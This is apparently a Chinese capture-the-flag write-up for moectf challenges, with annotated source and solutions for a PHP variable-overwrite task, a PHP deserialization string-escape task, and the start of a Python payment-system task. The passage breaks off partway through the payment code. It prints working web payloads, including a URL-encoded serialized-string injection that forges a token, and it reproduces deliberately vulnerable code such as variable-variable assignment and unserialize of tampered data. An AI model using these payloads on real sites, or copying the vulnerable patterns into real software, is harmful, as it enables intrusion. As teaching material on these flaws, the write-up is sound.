+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;source.txt&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&#x27;xxxxxxxx&#x27;</span>;</span><br><span class="line"><span class="variable">$giveme</span> = <span class="string">&#x27;can can need flag!&#x27;</span>;</span><br><span class="line"><span class="variable">$getout</span> = <span class="string">&#x27;No! flag.Try again. Come on!&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$giveme</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span> || <span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$getout</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">    <span class="variable">$$key</span> = <span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">    <span class="variable">$$key</span> = <span class="variable">$$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;the flag is : &#x27;</span> . <span class="variable">$flag</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>是一道 PHP 变量覆盖的题目，添加注释后的代码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;source.txt&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&#x27;xxxxxxxx&#x27;</span>;</span><br><span class="line"><span class="variable">$giveme</span> = <span class="string">&#x27;can can need flag!&#x27;</span>;</span><br><span class="line"><span class="variable">$getout</span> = <span class="string">&#x27;No! flag.Try again. Come on!&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 必须传入 flag 参数（GET 或 POSt）</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$giveme</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 传入的 flag 参数的值不能为 flag</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span> || <span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$getout</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 把 POST 过去的键值（key vaule）对变成值为 vaule 的变量 key</span></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">    <span class="variable">$$key</span> = <span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 对于 GET 过去的键值（key vaule）对，把 vaule 变量的值赋给 key 变量</span></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">    <span class="variable">$$key</span> = <span class="variable">$$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;the flag is : &#x27;</span> . <span class="variable">$flag</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>不是很绕，Payload（GET）：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?aaa=flag&amp;flag=aaa</span><br></pre></td></tr></table></figure>
+
+<p>利用中间变量<code>aaa</code>，得到 flag：<code>moectf{Wa0g_Yi1g_Chu0}</code></p>
+<h3 id="baby-unserialize"><a href="#baby-unserialize" class="headerlink" title="baby_unserialize"></a>baby_unserialize</h3><p>一道 PHP 反序列化字符串逃逸的题目，先看源码，<code>index.php</code>如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">moectf</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;heizi&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$r</span>,<span class="variable">$s</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="variable">$r</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b = <span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$r</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>];</span><br><span class="line"><span class="variable">$s</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;s&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$r</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$s</span>) )&#123;</span><br><span class="line">    <span class="variable">$moe</span> = <span class="keyword">new</span> <span class="title function_ invoke__">moectf</span>(<span class="variable">$r</span>,<span class="variable">$s</span>);</span><br><span class="line">    <span class="variable">$emo</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;aiyo&#x27;</span>, <span class="string">&#x27;ganma&#x27;</span>, <span class="title function_ invoke__">serialize</span>(<span class="variable">$moe</span>));</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;moe&#x27;</span>]=<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$emo</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这段代码接受两个参数，用它们实例化了一个对象<code>moectf</code>，该类中有一个特殊的字段<code>token</code>，就目前来说它是不可控的，然后序列化了它，把其中的<code>aiyo</code>替换成了<code>ganma</code>，编码后放在了<code>$_SESSION</code>数组中，这个数组我们不可以直接控制也不能查看，因为它存储在服务器端，根据提示我们再来看另一段代码<code>a.php</code>：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">moectf</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;heizi&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$r</span>,<span class="variable">$s</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="variable">$r</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b = <span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;moe&#x27;</span>] == <span class="number">1</span>)&#123;</span><br><span class="line">    <span class="variable">$moe</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;moe&#x27;</span>]));</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$moe</span>-&gt;token==<span class="string">&#x27;baizi&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们能明显的发现，想拿到 flag，就必须使两个 if 成立，第一个好解决，我们直接设置 Cookie 就可以了，问题出在第二个判断语句，它解码后反序列化了我们上一步放在<code>$_SESSION</code>里的元素<code>moe</code>，并验证<code>token</code>是不是等于<code>baizi</code>，但是由<code>index.php</code>可知<code>token</code>是不可控字段，并且我们也没办法直接修改该数组的元素，这时候就要想到 PHP 的反序列化字符串逃逸：</p>
+<p>这里你可以参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/hello-there/p/12870541.html">浅谈php序列化字符串逃逸问题</a> 的<code>第一种情况：替换修改之后导致序列化字符串长度变长</code>，我就不在这里详细地说具体的原理了，Payload 如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyo<span class="string">&quot;;s:1:&quot;</span>b<span class="string">&quot;;s:1:&quot;</span><span class="number">2</span><span class="string">&quot;;s:5:&quot;</span>token<span class="string">&quot;;s:5:&quot;</span>baizi<span class="string">&quot;;&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>URL 编码后：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyo%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">22</span>b%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">222</span>%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A5%<span class="number">3</span>A%<span class="number">22</span>token%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A5%<span class="number">3</span>A%<span class="number">22</span>baizi%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">7</span>D</span><br></pre></td></tr></table></figure>
+
+<p>最终的 Payload（GET 提交到<code>index.php</code>）：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?r=aiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyo%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">22</span>b%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">222</span>%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A5%<span class="number">3</span>A%<span class="number">22</span>token%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A5%<span class="number">3</span>A%<span class="number">22</span>baizi%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">7</span>D&amp;s=<span class="number">2</span></span><br></pre></td></tr></table></figure>
+
+<p>这里为了好理解，把替换前后序列化的结果写出来：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 替换前：</span></span><br><span class="line">O:<span class="number">6</span>:<span class="string">&quot;moectf&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;s:<span class="number">215</span>:<span class="string">&quot;aiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyoaiyo&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;b&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;2&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;token&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;baizi&quot;</span>;&#125;<span class="string">&quot;;s:1:&quot;</span>b<span class="string">&quot;;s:1:&quot;</span><span class="number">2</span><span class="string">&quot;;s:5:&quot;</span>token<span class="string">&quot;;s:5:&quot;</span>heizi<span class="string">&quot;;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// 替换后：</span></span><br><span class="line"><span class="string">O:6:&quot;</span>moectf<span class="string">&quot;:3:&#123;s:1:&quot;</span>a<span class="string">&quot;;s:215:&quot;</span>ganmaganmaganmaganmaganmaganmaganmaganmaganmaganmaganmaganmaganmaganmaganmaganmaganmaganmaganmaganmaganmaganmaganmaganmaganmaganmaganmaganmaganmaganmaganmaganmaganmaganmaganmaganmaganmaganmaganmaganmaganmaganmaganma<span class="string">&quot;;s:1:&quot;</span>b<span class="string">&quot;;s:1:&quot;</span><span class="number">2</span><span class="string">&quot;;s:5:&quot;</span>token<span class="string">&quot;;s:5:&quot;</span>baizi<span class="string">&quot;;&#125;&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;b&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;2&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;token&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;heizi&quot;</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 其中变量 a 的值的长度是 215，刚好是替换后这一大段 ganma 的长度</span></span><br><span class="line"><span class="comment">// 而我们写入的其他元素：;s:1:&quot;b&quot;;s:1:&quot;2&quot;;s:5:&quot;token&quot;;s:5:&quot;baizi&quot;;&#125;，刚好替换掉了原来的元素，逃逸了出来</span></span><br><span class="line"><span class="comment">// 原来的元素：;s:1:&quot;b&quot;;s:1:&quot;2&quot;;s:5:&quot;token&quot;;s:5:&quot;heizi&quot;;&#125; 被无情地抛弃</span></span><br><span class="line"><span class="comment">// 这里注意在完整的序列化数据后添加其他字符并不会导致反序列化失败，在这里 ;s:1:&quot;b&quot;;s:1:&quot;2&quot;;s:5:&quot;token&quot;;s:5:&quot;heizi&quot;;&#125;（原来的元素）就相当于多添加的其他字符</span></span><br></pre></td></tr></table></figure>
+
+<p>然后访问<code>a.php</code>添加 Cookie：<code>moe = 1</code>，就能获得 flag：<code>moe{Her3_1s_Y0ur_fl4g}</code></p>
+<h3 id="支付系统"><a href="#支付系统" class="headerlink" title="支付系统"></a>支付系统</h3><p>一上来就看见一堆代码（注释都是我加上的）：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">from</span> quart <span class="keyword">import</span> Quart, render_template, redirect, jsonify, request, session</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> pbkdf2_hmac</span><br><span class="line"><span class="keyword">from</span> enum <span class="keyword">import</span> IntEnum</span><br><span class="line"><span class="keyword">from</span> tortoise <span class="keyword">import</span> fields</span><br><span class="line"><span class="keyword">from</span> tortoise.models <span class="keyword">import</span> Model</span><br><span class="line"><span class="keyword">from</span> tortoise.contrib.quart <span class="keyword">import</span> register_tortoise</span><br><span class="line"><span class="keyword">from</span> httpx <span class="keyword">import</span> AsyncClient</span><br><span class="line"></span><br><span class="line">app = Quart(__name__)</span><br><span class="line"><span class="comment"># 随机的 secret_key</span></span><br><span class="line">app.secret_key = os.urandom(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 枚举类，记录交易的状态</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TransactionStatus</span>(<span class="title class_ inherited__">IntEnum</span>):</span><br><span class="line">    SUCCESS = <span class="number">0</span></span><br><span class="line">    PENDING = <span class="number">1</span></span><br><span class="line">    FAILED = <span class="number">2</span></span><br><span class="line">    TIMEOUT = <span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 记录一次交易的所有信息</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Transaction</span>(<span class="title class_ inherited__">Model</span>):</span><br><span class="line">    <span class="built_in">id</span> = fields.IntField(pk=<span class="literal">True</span>)</span><br><span class="line">    user = fields.UUIDField()</span><br><span class="line">    amount = fields.IntField()</span><br><span class="line">    status = fields.IntEnumField(TransactionStatus)</span><br><span class="line">    desc = fields.TextField()</span><br><span class="line">    <span class="built_in">hash</span> = fields.CharField(<span class="number">64</span>, null=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, **kwargs</span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line">        <span class="keyword">for</span> k, v <span class="keyword">in</span> kwargs.items():</span><br><span class="line">            <span class="variable language_">self</span>.__setattr__(k, v)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将交易信息打包后发送到 http://localhost:8000/callback</span></span><br><span class="line"><span class="comment"># 注意添加了一个哈希值作为验证字段</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">do_callback</span>(<span class="params">transaction: Transaction</span>):</span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">with</span> AsyncClient() <span class="keyword">as</span> ses:</span><br><span class="line">        <span class="comment"># 注意这里的 status 被修改为 FAILED</span></span><br><span class="line">        transaction.status = <span class="built_in">int</span>(TransactionStatus.FAILED)</span><br><span class="line">        data = (</span><br><span class="line">            <span class="string">f&#x27;<span class="subst">&#123;transaction.<span class="built_in">id</span>&#125;</span>&#x27;</span></span><br><span class="line">            <span class="string">f&#x27;<span class="subst">&#123;transaction.user&#125;</span>&#x27;</span></span><br><span class="line">            <span class="string">f&#x27;<span class="subst">&#123;transaction.amount&#125;</span>&#x27;</span></span><br><span class="line">            <span class="string">f&#x27;<span class="subst">&#123;transaction.status&#125;</span>&#x27;</span></span><br><span class="line">            <span class="string">f&#x27;<span class="subst">&#123;transaction.desc&#125;</span>&#x27;</span></span><br><span class="line">        ).encode()</span><br><span class="line">        <span class="keyword">await</span> ses.post(<span class="string">f&#x27;http://localhost:8000/callback&#x27;</span>, data=&#123;</span><br><span class="line">            <span class="string">&#x27;id&#x27;</span>: transaction.<span class="built_in">id</span>,</span><br><span class="line">            <span class="string">&#x27;user&#x27;</span>: transaction.user,</span><br><span class="line">            <span class="string">&#x27;amount&#x27;</span>: transaction.amount,</span><br><span class="line">            <span class="string">&#x27;desc&#x27;</span>: transaction.desc,</span><br><span class="line">            <span class="string">&#x27;status&#x27;</span>: transaction.status,</span><br><span class="line">            <span class="string">&#x27;hash&#x27;</span>: pbkdf2_hmac(<span class="string">&#x27;sha256&#x27;</span>, data, app.secret_key, <span class="number">2</span>**<span class="number">20</span>).<span class="built_in">hex</span>()</span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 装饰器 app.before_request：在请求收到之前绑定一个函数做一些事情</span></span><br><span class="line"><span class="comment"># 这里创建了 session，并把 balance 设置为零</span></span><br><span class="line"><span class="comment"># 接着把所有交易状态为成功（SUCCESS）的交易的金额（amount）累加到 balance</span></span><br><span class="line"><span class="meta">@app.before_request</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">create_session</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;uid&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> session:</span><br><span class="line">        session[<span class="string">&#x27;uid&#x27;</span>] = <span class="built_in">str</span>(uuid.uuid4())</span><br><span class="line">    session[<span class="string">&#x27;balance&#x27;</span>] = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> tr <span class="keyword">in</span> <span class="keyword">await</span> Transaction.<span class="built_in">filter</span>(user=session[<span class="string">&#x27;uid&#x27;</span>]).<span class="built_in">all</span>():</span><br><span class="line">        <span class="keyword">if</span> tr.status == TransactionStatus.SUCCESS:</span><br><span class="line">            session[<span class="string">&#x27;balance&#x27;</span>] += tr.amount</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 路由 /pay 收集 GET 的参数（amount、desc），准备创建一次交易</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/pay&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">pay</span>():</span><br><span class="line">    transaction = <span class="keyword">await</span> Transaction.create(</span><br><span class="line">        amount=request.args.get(<span class="string">&#x27;amount&#x27;</span>),</span><br><span class="line">        desc=request.args.get(<span class="string">&#x27;desc&#x27;</span>),</span><br><span class="line">        <span class="comment"># 这里的 status 被设置为为 PENDING</span></span><br><span class="line">        status=TransactionStatus.PENDING,</span><br><span class="line">        user=uuid.UUID(session.get(<span class="string">&#x27;uid&#x27;</span>))</span><br><span class="line">    )</span><br><span class="line">    <span class="comment"># 将数据（transaction）传递给函数（do_callback）去执行</span></span><br><span class="line">    app.add_background_task(do_callback, transaction)</span><br><span class="line">    <span class="comment"># 重定向到 /transaction?id=，显示交易结果</span></span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">f&#x27;/transaction?id=<span 